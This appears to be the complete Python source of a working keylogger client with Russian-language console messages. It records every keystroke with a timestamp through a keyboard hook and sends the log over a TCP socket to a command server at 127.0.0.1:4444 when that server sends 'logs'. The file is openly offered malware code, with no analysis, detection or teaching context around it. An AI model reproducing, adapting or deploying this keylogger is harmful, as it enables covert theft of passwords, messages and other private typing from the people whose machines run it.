from datetime import datetime
from pystyle import *
import platform
import keyboard
import socket
import time
import sys
import os

Success = Colors.green + "[+]" + Colors.reset
Error = Colors.red + "[-]" + Colors.reset
Info = Colors.blue + "[*]" + Colors.reset

list = []

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def connect_to_server():
    try:
        sock.connect(("127.0.0.1", 4444))
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Success} Подключение к серверу произошло успешно!")
        return True
    except Exception as e:
        print(f"Ошибка подключения: {e}")
        return False


def on_key_press(event):
    time_now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    list.append(f"[{time_now}] {event.name}")
    print(f"{Info} Записано нажатие: {event.name}")


def save_and_send_logs():
    logs = "\n".join(list)
    try:
        sock.sendall(logs.encode())
        list.clear()
        print("\n")
    except Exception as e:
        print(f"{Error} Ошибка отправки: {e}")


def handle_server_commands():
    while True:
        try:
            command = sock.recv(4096).decode().strip()
            if not command:
                continue
            print(f"{Info} Получена команда от сервера: {command}")
            
            if command.lower() == "logs":
                save_and_send_logs()
            elif command.lower() == "break":
                print(f"\n{Error} Отключение от сервера...")
                sock.close()
                print("")
                break
        except Exception as e:
            print(f"{Error} Ошибка приёма команды: {e}")
            print("")
            break


def root_check():
    os.system('cls' if os.name == 'nt' else 'clear')

    if os.getuid() != 0:
        print(f"{Error} Требуются права root!")
        sys.exit(1)
    else:
        pass


def platform_system():
    if platform.system() == "Windows":
        if not connect_to_server():
            return
        
        keyboard.on_press(on_key_press)
        
        time.sleep(2)
        print(f"\n{Success} Кейлоггер запущен!\n\n")
        
        handle_server_commands()
    else:
        root_check()
        if not connect_to_server():
            return
        
        keyboard.on_press(on_key_press)
        
        time.sleep(2)
        print(f"\n{Success} Кейлоггер запущен!\n\n")

        handle_server_commands()


def main():
    platform_system()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.green + "\nДо свидания!" + Colors.reset)

